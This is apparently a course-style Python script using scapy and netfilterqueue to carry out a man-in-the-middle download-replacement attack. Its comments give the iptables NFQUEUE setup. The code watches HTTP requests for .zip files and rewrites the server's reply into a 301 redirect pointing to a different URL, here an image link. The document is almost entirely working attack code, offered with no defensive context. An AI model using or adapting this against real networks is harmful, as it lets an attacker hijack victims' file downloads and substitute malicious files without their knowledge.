#!/usr/bin/env python

# before running the main code we need to run some commands like iptables -I OUTPUT -j NFQUEUE --queue-num 0
# and iptables -I INPUT -j NFQUEUE --queue-num 0
# to start our own web server the command is service apache2 start

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".zip" in str(scapy_packet[scapy.Raw].load):
                print("[+] zip Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://images.pexels.com/photos/27956127/pexels-photo-27956127.jpeg?cs=srgb&dl=pexels-branka-krnjaja-1475677195-27956127.jpg&fm=jpg")
                packet.set_payload(bytes(modified_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
